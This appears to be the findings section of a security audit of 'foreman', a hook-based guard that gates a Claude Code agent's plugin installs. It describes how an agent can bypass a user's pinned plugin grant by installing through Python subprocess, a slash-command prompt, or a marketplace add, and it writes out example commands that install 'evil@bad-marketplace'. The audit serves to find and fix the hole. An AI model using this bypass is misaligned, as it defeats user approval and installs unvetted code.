## Findings

**HIGH** — `~/.claude/foreman/plugin/lib/fmhooks.py:344-352` (`_pin_problem`) + `~/.claude/foreman/plugin/lib/fmguard.py:414,773,192` — The pin check only fires when the "plugin" finding's detail string ends with the literal suffix `" [plugin <id>]"`. That suffix is appended by exactly two code paths: `check_bash`'s handling of `fm plugins install|enable` (fmguard.py:509-511) and `_check_claude_config`'s handling of `claude plugin install|i|enable` (fmguard.py:782-784). Every other producer of a `"plugin"` category finding — `_interpreter_writes` (fmguard.py:414, interpreter code that calls `claude plugin/mcp/config`), the prompt slash-command detector (fmguard.py:773, `claude -p '/plugin install X'`), a direct tree write into `~/.claude/plugins` (fmguard.py:192, `_GUARDED_BY_PATH`), and `claude plugin marketplace add/remove/update`, `claude mcp add`, `claude config set` (fmguard.py:781, 784 with no target for marketplace) — carries no `[plugin X]` suffix. For those, `_pin_problem` returns `None` (regex doesn't match, fmhooks.py:345-346) regardless of the actual plugin the call installs, so `_pre_tool_use` (fmhooks.py:425-431) falls through to `_use_plugin_grant`, which spends the grant unconditionally.
  - **Exploit**: user runs `fm ask T-0036 plugin --pin a@m`, sees the dialog ("The plugin yes holds only for installing or enabling a@m…"), says yes. Agent then runs, as its own Bash call: `python3 -c "import subprocess; subprocess.run(['claude','plugin','install','evil@bad-marketplace'])"`. `_interpreter_writes` matches (`_EXEC_API` on `subprocess`, `_CLAUDE_IN_CODE` on the quoted `'claude'…'plugin'` argv literal) and returns `("plugin", "interpreter code running claude's plugin, MCP or config commands")` — no suffix. `_pin_problem` sees no `[plugin …]` match, returns `None`; `_use_plugin_grant` succeeds; the call is let through and `claude plugin install evil@bad-marketplace` actually runs, installing a plugin the user never named or approved.
  - Same bypass with `claude -p '/plugin install evil@bad-marketplace'` (fmguard.py:772-773) or `claude plugin marketplace add evil-org/evil-repo` (fmguard.py:781, no target check) using the identical pinned grant.
  - **Fix**: either (a) extend `_pin_problem` to require a resolvable single-plugin target for *every* "plugin" finding, not just the two suffixed shapes (block interpreter/slash/marketplace/mcp/config-under-a-pin instead of letting them through unchecked), or (b) if those routes are meant to stay pin-exempt, make `_ask_prompt`'s dialog copy (fmhooks.py:583, "the plugin yes holds only for installing or enabling {pin}") accurately state that the grant still covers other plugin/MCP/config changes made through other spellings, so the user isn't told a narrower guarantee than the code delivers. Partially disclosed already in MASTER.md's known-limitations note, but the disclosure undersells that it defeats the pin for marketplace adds too, not just interpreter/slash paths.
  - Confidence: high — traced end to end with line citations; matches the project's own documented past finding class ("commands the guard parses in one spelling but not another").

**LOW** — `~/.claude/foreman/plugin/lib/fmplugins.py:388-398` (`content_hash`) — TOCTOU between the hash computed at grant/PreToolUse time and what Claude Code actually installs (marketplace can refresh between the check and the real install; a remote source with no pinned ref/sha only hashes the manifest entry, not the code).
